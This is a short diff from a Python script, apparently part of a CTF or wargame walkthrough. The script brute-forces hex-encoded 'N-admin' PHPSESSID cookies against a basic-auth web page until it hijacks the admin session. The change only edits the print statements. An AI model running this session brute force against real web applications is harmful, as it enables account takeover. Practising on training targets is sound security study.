@@ -43,10 +43,10 @@ for i in range(1, 640 + 1):
     COOKIES['PHPSESSID'] = bytes.hex(str(i).encode() + b'-admin')
     res = get(url=URL, auth=AUTH, cookies=COOKIES)
     if "Password" in res.text:
-        print(f"admin PHPSESSID value is: {i}")
+        print(f"admin PHPSESSID value is: {COOKIES['PHPSESSID']} ({str(i)+'-admin'})")
         break
     else:
-        print(f"admin PHPSESSID value is NOT: {i}")
+        print(f"admin PHPSESSID value is NOT: {COOKIES['PHPSESSID']} ({str(i)+'-admin'})")
 
 print(res.text)
 ```
